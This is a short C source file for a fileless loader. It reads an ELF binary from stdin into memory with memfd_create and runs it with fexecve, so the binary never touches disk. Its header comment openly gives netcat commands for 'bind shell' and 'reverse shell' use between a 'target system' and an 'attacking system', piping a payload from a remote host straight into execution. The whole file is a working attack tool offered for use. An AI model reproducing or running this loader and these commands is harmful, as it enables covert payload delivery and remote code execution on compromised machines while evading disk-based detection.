/*
 * This reads an ELF from stdin and executes it in memory using memfd_create
 * and fexecve. You can use this with netcat!!
 *
 * build: gcc -o fexecve-from-stdin fexecve-from-stdin.c
 *
 * examples:
 *    bind shell:
 *    % nc -lp 4444 | ./fexecve-from-stdin <args>  ### on target system
 *    % cat file | nc host 4444                    ### on attacking system
 *
 *    reverse shell:
 *    % nc host 4444 | ./fexecve-from-stdin <args> ### on target system
 *    % cat file | nc -lp 4444                     ### on attacking system
 *
 * Doesnt work with shell scripts, python, etc. :(
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#include <sys/syscall.h>

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif


static inline int memfd_create(const char *name, unsigned int flags) {
  return syscall(__NR_memfd_create, name, flags);
}


int main(int argc, char *argv[], char *envp[]) {
  int memfd;
  int result;

  memfd = memfd_create("asdf", MFD_CLOEXEC);
  if (memfd == -1) {
    fprintf(stderr, "memfd_create(): %s\n", strerror(errno));
    return EXIT_FAILURE;
  }
  

  for(;;) {
    int n;
    char buf[1024];
    n = fread(buf, 1, sizeof(buf), stdin);
    if (n == 0)
      break;

    write(memfd, buf, n);
  }

  result = fexecve(memfd, argv, envp);
  close(memfd);

  return result;
}
